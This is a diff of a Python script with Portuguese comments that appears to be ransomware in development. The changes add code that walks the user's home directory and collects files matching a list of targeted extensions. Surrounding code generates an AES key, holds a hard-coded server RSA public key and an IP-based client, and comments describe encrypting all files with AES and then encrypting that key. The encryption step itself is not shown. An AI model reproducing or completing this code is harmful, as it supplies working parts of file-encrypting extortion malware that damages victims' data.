@@ -37,28 +37,32 @@ texto='''
 '''
 
 def menu():
+    # caminho de partida
     home=os.environ['HOME']
-    print('Partindo de: '+str(home))
-    # lista com todos os arquivos #
-    diretorios=os.listdir(os.getcwd())
+    # lista com os tipos
+    f=open('tipos_arquivos.txt','r')
+    tipos=f.read()
+    tipos=tipos.split('\n')
+    # diretorios no caminho de partida
+    diretorios=os.listdir(home)
     tam=len(diretorios)
     # CRIAR UMA THREAD PARA CADA DIRETORIO
     # CADA THREAD LISTAR DIRETORIO
-    retorno=listar(home)
-    for arquivo in retorno:
-        print(arquivo)
+    retorno=listar(home,tipos)
 
-def listar(diretorio):
+
+def listar(diretorio, tipos):
     # cria uma lista onde será adicionado o nome dos arquivos #
     arquivos=[]
     for caminho, diretorio, arquivo in os.walk(diretorio):
         for arq in arquivo:
             a=caminho+'/'+arq
             extensao=os.path.splitext(a)
-            if():
-                # a=a.replace(" ", "\ ").replace(" (", " \("). replace(")", "\)")
-                # arquivos.append(a)
-    return arquivos
+            for ext in tipos:
+                if(extensao[1]==ext):
+                    a=a.replace(" ", "\ ").replace(" (", " \("). replace(")", "\)")
+                    arquivos.append(a)
+    return (arquivos)
 
 def client(IP_serv):
 
@@ -84,14 +88,14 @@ def gera_chave_AES():
     return senha
 
 
-
-if __name__=="__main__":
+menu()
+#if __name__=="__main__":
     # Chave pública do servidor
-    serv_RSA=[1121,655]
+    #serv_RSA=[1121,655]
     # gera a senha AES
-    senha_AES=gera_chave_AES()
+    #senha_AES=gera_chave_AES()
     # gera a senha RSA
-    senha_RSA=gera_chaves_RSA()
+    #senha_RSA=gera_chaves_RSA()
     # criptografa todos os arquivos com AES
 
     # criptografa a chave AES
